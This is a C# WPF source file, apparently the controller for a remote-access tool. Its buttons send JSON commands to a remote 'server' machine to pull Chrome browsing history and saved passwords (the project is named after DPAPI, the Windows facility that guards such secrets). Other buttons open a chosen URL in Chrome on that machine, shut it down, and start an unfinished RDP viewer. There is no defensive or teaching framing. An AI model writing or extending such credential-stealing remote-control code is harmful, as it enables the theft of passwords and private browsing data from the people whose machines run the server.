using client;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using static DPAPI___Wpf.Form1;

namespace DPAPI___Wpf
{
    /// <summary>
    /// Interaction logic for Window1.xaml
    /// </summary>
    public partial class Window1 : Window
    {
        public Window1()
        {
            InitializeComponent();
            

    }
        //RDPCOMAPILib.RDPViewer axRDPViewer;

        ////public AxRDPCOMAPILib.AxRDPViewer axRDPViewer = new AxRDPViewer();

        //public static void Connect(string invitation, RDPViewer display, string userName, string password)
        //{
        //    //display.focused

        //    display.Connect(invitation, userName, password);
        //}

        //public static void disconnect(RDPViewer display)
        //{
        //    display.Disconnect();
        //}

        private async void BtnGetData_Click(object sender, RoutedEventArgs e)
        {
            await Dispatcher.BeginInvoke(new Action(async () =>
            {
                CircularProgressBar.CircularProgressBar bar = new CircularProgressBar.CircularProgressBar();
                StackPanel myPanel = new StackPanel();
                //myPanel.Children.Add(bar);
                try
                {
                    Dictionary<string, string> myDic = new Dictionary<string, string>()
            {
                {"Command", "History" }
            };
                    string sendToSender = await Sender.send_and_get_message(JsonConvert.SerializeObject(myDic));
                    dynamic result = JsonConvert.DeserializeObject(sendToSender);

                    if (result.STATUS == "OK")
                    {
                        DataTable dt = JsonConvert.DeserializeObject<DataTable>((string)result.HistoryResult);
                        gv.ItemsSource = dt.AsDataView();
                        Chrome_History_Window window = new Chrome_History_Window(dt);
                        window.Show();

                    }
                    else
                    {

                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("[-----DEBUGGER----- " + ex.Message + "-----END DEBUGGER-----]");
                }
            }));
        }


        private void DoServerStuff()
        {
            const int PORT_NO = 5000;
            const string SERVER_IP = "127.0.0.1";

                //---listen at the specified IP and port no.---
                IPAddress localAdd = IPAddress.Parse(SERVER_IP);
                TcpListener listener = new TcpListener(localAdd, PORT_NO);
            MessageBox.Show("Listening...");
                listener.Start();

                //---incoming client connected---
                TcpClient client = listener.AcceptTcpClient();

                //---get the incoming data through a network stream---
                NetworkStream nwStream = client.GetStream();
                byte[] buffer = new byte[client.ReceiveBufferSize];

                //---read incoming stream---
                int bytesRead = nwStream.Read(buffer, 0, client.ReceiveBufferSize);

                //---convert the data received into a string---
                string dataReceived = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                //Console.WriteLine("Received : " + dataReceived);
                try
                {
                    var result = JsonConvert.DeserializeObject<DataTable>(dataReceived);
                    DataTable tmp = (DataTable)result;
                //dataGridView1.ItemsSource = tmp.AsDataView();

                }
                catch (Exception ex)
                {

                MessageBox.Show(ex.Message);
                }
                //---write back the text to the client---
                //Console.WriteLine("Sending back : " + dataReceived);
                //nwStream.Write(buffer, 0, bytesRead);
                client.Close();
                listener.Stop();
                Console.ReadLine();
            }
        
    
        private async void btnGetPasswords_Click(object sender, RoutedEventArgs e)
        {
            await Dispatcher.BeginInvoke(new Action(async () =>
            {
                try
                {
                    Dictionary<string, string> myDic = new Dictionary<string, string>()
            {
                {"Command", "Passwords" }
            };
                    string sendToSender = await Sender.send_and_get_message(JsonConvert.SerializeObject(myDic));
                    dynamic result = JsonConvert.DeserializeObject(sendToSender);

                    if (result.STATUS == "OK")
                    {
                        DataTable dt = JsonConvert.DeserializeObject<DataTable>((string)result.PasswordsResult);
                        gv.ItemsSource = dt.AsDataView();
                    }
                    else
                    {

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    //Debug.WriteLine("[-----DEBUGGER----- " + ex.Message + "-----END DEBUGGER-----]");
                }
            }));
        }

        private async void btnShutServer_Click(object sender, RoutedEventArgs e)
        {
            await Dispatcher.BeginInvoke(new Action(async () =>
            {
                try
                {
                    Dictionary<string, string> myDic = new Dictionary<string, string>()
            {
                {"Command", "Shut_Down" }
            };
                    string sendToSender = await Sender.send_and_get_message(JsonConvert.SerializeObject(myDic));
                    pBarTransferBytes.Value = 100;
                    dynamic result = JsonConvert.DeserializeObject(sendToSender);
                    if (result.STATUS == "OK")
                    {
                        MessageBox.Show("The server has successfully shut down.", "Shut Down Success", MessageBoxButton.OK, MessageBoxImage.Asterisk);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("[-----DEBUGGER----- " + ex.Message + "-----END DEBUGGER-----]");
                }
            }));
        }

        private void btnRDP_Click(object sender, RoutedEventArgs e)
        {
            //try
            //{
            //    Connect(tbConnString.Text, this.axRDPViewer, "", "");
            //}
            //catch (Exception)
            //{
            //    MessageBox.Show("Unable to connect to the Server");
            //}
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Form1 form = new Form1();
            form.Show();
        }

        private async void btnOpenUrl_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string defaultSite = "www.google.com";
                Dictionary<string, string> myDic = new Dictionary<string, string>()
            {
                 { "Command", "CHROME_OPEN" },
                 { "CHROMEURL", $"{(tbChromeUrl.Text == string.Empty ? defaultSite : tbChromeUrl.Text)}" }
                
            };
                string sendToSender = await Sender.send_and_get_message(JsonConvert.SerializeObject(myDic));
                dynamic result = JsonConvert.DeserializeObject(sendToSender);
                if (result.STATUS == "OK")
                {
                    MessageBox.Show($@"[{(tbChromeUrl.Text == string.Empty ? defaultSite : tbChromeUrl.Text)}] has been successflly opened in the server's computer !");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("[-----DEBUGGER----- " + ex.Message + "-----END DEBUGGER-----]");
            }
        }
    }
}